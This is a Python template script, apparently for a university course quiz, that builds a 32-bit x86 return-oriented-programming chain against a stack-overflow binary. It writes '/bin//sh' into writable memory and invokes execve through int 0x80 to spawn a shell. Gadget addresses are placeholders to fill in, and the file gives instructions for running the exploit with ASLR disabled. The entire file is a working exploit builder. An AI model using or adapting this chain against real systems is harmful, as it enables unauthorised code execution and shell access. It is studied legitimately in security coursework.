#!/usr/bin/env python3
"""
solve_rop_template.py — ROP chain builder template for EPL326 quiz
Copy this file, rename it (e.g. solve_rop_quiz4.py), fill in the values below.

Workflow:
  1. Run find_gadgets.py ./binary  → get gadget addresses
  2. Run GDB to get OFFSET and buf_addr (if needed)
  3. Fill in the values in CONFIGURE section below
  4. Run: python3 solve_rop_quiz4.py
  5. Verify: echo 'id' | env -i TEMP=1000 setarch i686 -R --3gb ./binary ./exploit.X
"""

import struct, os

# ── CONFIGURE THESE ──────────────────────────────────────────────────────────
BINARY  = "./bin.X"           # path to binary
OUTPUT  = "./exploit.X"       # output exploit file
OFFSET  = 52                  # bytes from buffer start to return address
                              # from GDB: lea -0xNN(%ebp) → offset = NN + 4

# Writable memory address — where we write "/bin//sh"
# Option 1: .bss section address (readelf -S ./binary | grep .bss)
# Option 2: mmap region + 0x500 (if binary calls mmap in main)
# WARNING: do NOT use .bss if binary has init_data() or stores TEMP there
WR_ADDR = 0x0804a060

# Gadget addresses — from find_gadgets.py or manual objdump
# Each gadget is: instruction; ret   (3 bytes: opcode + 0xc3)
G_POP_EAX_POP_EBX = 0x00000000   # pop eax; pop ebx; ret   (58 5b c3)
G_XOR_EAX_EAX     = 0x00000000   # xor eax,eax; ret        (31 c0 c3)
G_MOV_EBXPTR_EAX  = 0x00000000   # mov [ebx],eax; ret      (89 03 c3)
G_MOV_EBX_EAX     = 0x00000000   # mov ebx,eax; ret        (89 c3 c3)
G_XOR_ECX_ECX     = 0x00000000   # xor ecx,ecx; ret        (31 c9 c3)
G_XOR_EDX_EDX     = 0x00000000   # xor edx,edx; ret        (31 d2 c3)
G_MOV_AL_0B       = 0x00000000   # mov al,0xb; ret         (b0 0b c3)
G_INT_80          = 0x00000000   # int 0x80; ret            (cd 80 c3)
# ─────────────────────────────────────────────────────────────────────────────

def p32(v): return struct.pack('<I', v & 0xFFFFFFFF)

def validate():
    errors = []
    if G_POP_EAX_POP_EBX == 0: errors.append("G_POP_EAX_POP_EBX not set")
    if G_XOR_EAX_EAX     == 0: errors.append("G_XOR_EAX_EAX not set")
    if G_MOV_EBXPTR_EAX  == 0: errors.append("G_MOV_EBXPTR_EAX not set")
    if G_MOV_EBX_EAX     == 0: errors.append("G_MOV_EBX_EAX not set")
    if G_XOR_ECX_ECX     == 0: errors.append("G_XOR_ECX_ECX not set")
    if G_XOR_EDX_EDX     == 0: errors.append("G_XOR_EDX_EDX not set")
    if G_MOV_AL_0B       == 0: errors.append("G_MOV_AL_0B not set")
    if G_INT_80          == 0: errors.append("G_INT_80 not set")
    if WR_ADDR           == 0: errors.append("WR_ADDR not set")
    if errors:
        print("❌  Not configured:")
        for e in errors: print(f"   - {e}")
        return False
    return True

def build_chain():
    chain  = b'A' * OFFSET

    # Write "/bin" to WR_ADDR
    chain += p32(G_POP_EAX_POP_EBX)
    chain += b'/bin'              # popped into eax
    chain += p32(WR_ADDR)         # popped into ebx
    chain += p32(G_MOV_EBXPTR_EAX)  # [ebx] = eax → writes "/bin"

    # Write "//sh" to WR_ADDR+4
    chain += p32(G_POP_EAX_POP_EBX)
    chain += b'//sh'              # popped into eax
    chain += p32(WR_ADDR + 4)     # popped into ebx
    chain += p32(G_MOV_EBXPTR_EAX)  # [ebx] = eax → writes "//sh"

    # ebx = WR_ADDR (pointer to "/bin//sh")
    chain += p32(G_POP_EAX_POP_EBX)
    chain += p32(WR_ADDR)         # popped into eax
    chain += p32(0x41414141)      # dummy popped into ebx
    chain += p32(G_MOV_EBX_EAX)  # ebx = eax = WR_ADDR

    # ecx = 0, edx = 0, eax = 11
    chain += p32(G_XOR_ECX_ECX)
    chain += p32(G_XOR_EDX_EDX)
    chain += p32(G_XOR_EAX_EAX)
    chain += p32(G_MOV_AL_0B)

    # syscall
    chain += p32(G_INT_80)

    return chain

def main():
    print(f"\n[*] ROP Chain Builder — {BINARY}")
    print(f"    OFFSET={OFFSET}  WR_ADDR={hex(WR_ADDR)}\n")

    if not validate():
        return

    chain = build_chain()
    data  = str(len(chain)).encode() + b' ' + chain

    with open(OUTPUT, 'wb') as f:
        f.write(data)

    print(f"[+] Written {OUTPUT}  ({len(chain)} bytes payload)")
    print(f"\n[*] Verify with:")
    print(f"    echo 'id' | env -i TEMP=1000 setarch i686 -R --3gb {BINARY} {OUTPUT}")
    print(f"\n[*] Chain diagram:")
    print(f"    padding {OFFSET}B")
    print(f"    {hex(G_POP_EAX_POP_EBX)} → pop eax; pop ebx; ret")
    print(f"    '/bin' → eax")
    print(f"    {hex(WR_ADDR)} → ebx")
    print(f"    {hex(G_MOV_EBXPTR_EAX)} → mov [ebx],eax  (writes /bin)")
    print(f"    {hex(G_POP_EAX_POP_EBX)} → pop eax; pop ebx; ret")
    print(f"    '//sh' → eax")
    print(f"    {hex(WR_ADDR+4)} → ebx")
    print(f"    {hex(G_MOV_EBXPTR_EAX)} → mov [ebx],eax  (writes //sh)")
    print(f"    {hex(G_POP_EAX_POP_EBX)} → pop eax; pop ebx; ret")
    print(f"    {hex(WR_ADDR)} → eax")
    print(f"    0x41414141 → ebx (dummy)")
    print(f"    {hex(G_MOV_EBX_EAX)} → mov ebx,eax  (ebx = ptr to /bin//sh)")
    print(f"    {hex(G_XOR_ECX_ECX)} → xor ecx,ecx  (ecx=0)")
    print(f"    {hex(G_XOR_EDX_EDX)} → xor edx,edx  (edx=0)")
    print(f"    {hex(G_XOR_EAX_EAX)} → xor eax,eax")
    print(f"    {hex(G_MOV_AL_0B)} → mov al,0xb  (eax=11)")
    print(f"    {hex(G_INT_80)} → int 0x80  (SYSCALL)")

if __name__ == '__main__':
    main()
